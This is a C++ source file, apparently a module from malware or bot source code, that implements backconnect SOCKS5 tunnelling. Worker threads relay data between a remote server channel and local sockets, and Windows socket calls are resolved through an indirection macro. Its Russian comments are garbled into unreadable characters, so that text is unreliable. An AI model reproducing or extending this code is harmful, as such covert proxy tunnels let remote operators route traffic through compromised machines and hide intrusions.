//����������� �������� �� 100 ������������ �������� �������, ����� ��������� ��� � ��������
//��� ������������ ��� �������
#define FD_SETSIZE 100

#include "core\core.h"
#include "WndRec\sender.h"
#include "WndRec\manager.h"
#include "WndRec\tunnel.h"
#include "core\debug.h"

namespace WndRec
{

const int MaxConnectSockets = 100; //������������ ���������� ������������ ������� 

#pragma pack(1)
//��������� 
struct HeadTunnelPacket
{
	byte type; //0 - ��������� ��������� � ����������� �� ���������, 1 - ������, 2 - ������� �������
	uint id; //�� �������
};
#pragma pack()

struct TunnelDataThread
{
	ServerData* server;
	int state; //��������� ������: 0 - �������� (����� ������������ ��� ������ �������)
					//1 - ��������, 2 - ����������
	SocketId sockets[MaxConnectSockets];
	int c_sockets; //���������� ������������ ��������� � sockets
	int cmd; //��� ������� ������� ����� ����� � ��������
	ProtocolHandler pfunc; //���������� ��� �������� ������ ����������
};

static TunnelDataThread tunnelThreads[MaxServers];
static int countThreads = 0; //���������� ������������ ��������� � tunnelThreads

CRITICAL_SECTION lock;

bool initTunnels = false;

void InitTunnels()
{
	if( initTunnels ) return;
	initTunnels = true;
	countThreads = 0;
	CriticalSection::Init(lock);
}

static TunnelDataThread* FindThread( ServerData* server, int cmd )
{
	TunnelDataThread* ret = 0;
	//���� ������� �� ���� ��� ������� �������
	CriticalSection cs(lock);
	for( int i = 0; i < countThreads; i++ )
		if( tunnelThreads[i].server == server && tunnelThreads[i].cmd == cmd )
		{
			ret = &tunnelThreads[i];
			break;
		}
	return ret;
}

static TunnelDataThread* AddThread( ServerData* server, int cmd, ProtocolHandler pfunc )
{
	TunnelDataThread* ret = 0;
	CriticalSection cs(lock);
	//������� ���� ����� ����� ����������� �����
	for( int i = 0; i < countThreads; i++ )
		if( tunnelThreads[i].state == 0 ) //��������� ������
		{
			ret = &tunnelThreads[i];
			break;
		}
	if( ret == 0 ) //��������� ����� ���, ��������� �����
	{
		if( countThreads < MaxServers ) //����� ��� ����
		{
			ret = &tunnelThreads[countThreads];
			countThreads++;
		}
	}
	if( ret )
	{
		ret->server = server;
		ret->c_sockets = 0;
		ret->state = 1; //������ ������
		ret->cmd = cmd;
		ret->pfunc = pfunc;
	}
	return ret;
}

static DWORD SendToServer( ServerData* server, SocketId* si, int cmdServer, char* data, int szData, byte type )
{
	int c_p = sizeof(HeadTunnelPacket) + szData;
	Package* p = AllocPackage( server, c_p );
	if( p )
	{
		HeadTunnelPacket* h = (HeadTunnelPacket*)p->data.Ptr();
		h->type = type;
		h->id = si->id;
		p->data.Copy( sizeof(HeadTunnelPacket), data, szData );
		return WritePackage( server, cmdServer, p );
	}
	return 0;
}

static void CloseTunnel( ServerData* server, SocketId* si, int cmdServer, bool notSend = false )
{
	DbgMsg( "Close tunnel %d", si->id );
	Socket::Close(si->sc);
	if( !notSend )
		SendToServer( server, si, cmdServer, 0, 0, 2 );
	si->sc = 0;
	si->id = 0;
}

void CloseAllSockets( ServerData* server, SocketId* sockets, int c_sockets, int cmdServer )
{
	for( int i = 0; i < c_sockets; i++ )
		if( sockets[i].sc )
			CloseTunnel( server, &sockets[i], cmdServer );
}

int FromSocketsToServer( ServerData* server, SocketId* sockets, int c_sockets, int cmdServer, int wait )
{
	int ret = 0;
	int count = 0;
	fd_set fdsr;
	for( int i = 0; i < c_sockets; i++ )
		if( sockets[i].sc )
			fdsr.fd_array[count++] = sockets[i].sc;
	fdsr.fd_count = count;
	if( count > 0 )
	{
		timeval waitEvent;
		waitEvent.tv_sec = 0;
		waitEvent.tv_usec = wait;
		int events = API(WS2_32, select)( 0, &fdsr, NULL, NULL, &waitEvent );
		if( events == SOCKET_ERROR ) //���� ������, �� ��������� ��� ������
		{
			CloseAllSockets( server, sockets, c_sockets, cmdServer );
		}
		else
		{
			if( events > 0 )
			{
				int szMem = 4096 - sizeof(HeadTunnelPacket);
				char* mem = (char*)Mem::Alloc(szMem);
				if( mem == 0 )
					CloseAllSockets( server, sockets, c_sockets, cmdServer );
				else
				{
					for( int i = 0; i < events; i++ )
					{
						int j = 0;
						//���� ����� ������ (������ ������ ���� ������)
						for( ; j < c_sockets; j++ )
							if( fdsr.fd_array[i] == sockets[j].sc )
								break;
						int c = API(WS2_32, recv)( fdsr.fd_array[i], mem, szMem, 0 );
						if( c > 0 )
						{
							DWORD res = SendToServer( server, &sockets[j], cmdServer, mem, c, 1 );
							if( res == 0 ) //�� �����-�� ������� ����� �� ����������, ��������� ����������
								CloseTunnel( server, &sockets[j], cmdServer );
							else
								ret++;
						}
						else //������ ������, ���������
							CloseTunnel( server, &sockets[j], cmdServer );
					}
					Mem::Free(mem);
				}
			}
		}
	}
	else
	{
		wait /= 1000;
		if( wait == 0 ) wait = 1;
		Delay(wait);
	}
	return ret;
}

int FromServerToSockets( ServerData* server, SocketId* sockets, int& c_sockets, int cmdServer, ProtocolHandler pfunc )
{
	int ret = 0;
	int szMem = 4096 + 100;
	Mem::Data mem(szMem);
	int cmds[2][2];
	cmds[0][0] = cmds[0][1] = cmdServer;
	cmds[1][0] = cmds[1][1] = 0;
	for(;;)
	{
		int cmd;
		uint id;
		int sz = ReadCmd( server, cmd, id, cmds, mem, 0 ); //������� ������ �� ����� �� �������
		if( sz <= 0 ) break; //�� ������
		HeadTunnelPacket* h = (HeadTunnelPacket*)mem.Ptr();
		char* data = mem.p_char() + sizeof(HeadTunnelPacket);
		int szData = sz - sizeof(HeadTunnelPacket);
		SocketId* si = 0;
		//���� ������ ������ ��������� �����
		for( int i = 0; i < c_sockets; i++ )
			if( sockets[i].id == h->id )
			{
				si = &sockets[i];
				break;
			}
		if( si ) //����� �����
		{
			switch( h->type )
			{
				case 0: //������������ ���������
					{
						int len = data[0]; //���������� �������������� ������ ������������ �������� ��� �������� �����������
						if( pfunc( server, si, data + len + 1, szData - len - 1, data + 1, len ) == 1 )
							CloseTunnel( server, si, cmdServer );
					}
					break;
				case 1: //�������� ������
					if( si->type == 0 ) //��� �� ���� ����������� �� �������� ������ ������
					{
						if( pfunc( server, si, data, szData, 0, 0 ) == 1 )
							CloseTunnel( server, si, cmdServer );
					}
					else
					{
						int c = API(WS2_32, send)( si->sc, data, szData, 0 );
						if( c == 0 || c == SOCKET_ERROR )
							CloseTunnel( server, si, cmdServer );
					}
					break;
				case 2: //�������� �������
					CloseTunnel( server, si, cmdServer, true );
					break;
			}
			ret++;
		}
		else //����������� �����, �������� ������ ������ ������� �����
		{
			SocketId si2;
			Mem::Zero(si2);
			si2.id = h->id;
			if( h->type == 0 ) //������������ ���������, ������ ����� ������ �� �������� ������ ������
			{
				int len = data[0]; //���������� �������������� ������ ������������ �������� ��� �������� �����������
				int res = pfunc( server, &si2, data + len + 1, szData - len - 1, data + 1, len );
				if( res == 2 ) //�������� ����� �������, ��������� ��� � ������
				{
					if( c_sockets < FD_SETSIZE )
					{
						int i = 0;
						for( ; i < c_sockets; i++ )
							if( sockets[i].id == 0 ) break;
						Mem::Copy( (char*)&sockets[i], (char*)&si2, sizeof(si2) );
						if( i == c_sockets ) c_sockets++;
						DbgMsg( "Create socks5 tunnel id=%d, all=%d", h->id, c_sockets );
					}
					else
						CloseTunnel( server, &si2, cmdServer );
				}
				else if( res == 1 )
					SendToServer( server, &si2, cmdServer, 0, 0, 2 );
			}
			else
			{
				SendToServer( server, &si2, cmdServer, 0, 0, 2 );
			}
		}
	}
	return ret;
}

void SendProtocolData( ServerData* server, SocketId* si, int cmdServer, char* data, int szData )
{
	SendToServer( server, si, cmdServer, data, szData, 0 );
}

//���� � ����� ������� ������ ������, �� ��������� �� ����������
int CompactSockets( SocketId* sockets, int c_sockets )
{
	for( int i = c_sockets - 1; i >= 0; i-- )
		if( sockets[i].id == 0 )
			c_sockets--;
		else
			break;
	return c_sockets;
}

static DWORD WINAPI TunnelThread( void* data )
{
	TunnelDataThread* ss = (TunnelDataThread*)data;
	int wait = 1;
	while( ss->state == 1 )
	{
		int res1 = FromServerToSockets( ss->server, ss->sockets, ss->c_sockets, ss->cmd, ss->pfunc );
		int res2 = FromSocketsToServer( ss->server, ss->sockets, ss->c_sockets, ss->cmd, wait );
		ss->c_sockets = CompactSockets( ss->sockets, ss->c_sockets );
		if( res1 + res2 == 0 ) //������ �� ����, ����������� ����� ��������
		{
			wait += 10000;
			if( wait > 100000 ) wait = 100000; //�������� �� ������ 0.1�.
		}
		else
			wait = 1;
		if( ss->state == 2 ) break; //��������� ������� �� ��������� ������
	}
	//�������
	CloseAllSockets( ss->server, ss->sockets, ss->c_sockets, ss->cmd );
	CriticalSection cs(lock);
	ss->server = 0;
	ss->c_sockets = 0;
	ss->state = 0;
	if( ss == &tunnelThreads[countThreads - 1] ) //���� ��������� ������
		countThreads--;
	return 0;
}

bool StartTunnel( ServerData* server, int cmd, ProtocolHandler pfunc )
{
	TunnelDataThread* tdh = FindThread( server, cmd );
	if( tdh ) return true;
	tdh = AddThread( server, cmd, pfunc );
	if( tdh )
		return RunThread( TunnelThread, tdh );
	return false;
}

void StopTunnel( ServerData* server, int cmd )
{
	TunnelDataThread* tdh = FindThread( server, cmd );
	if( tdh )
		tdh->state = 2; //������������� �����
}

}
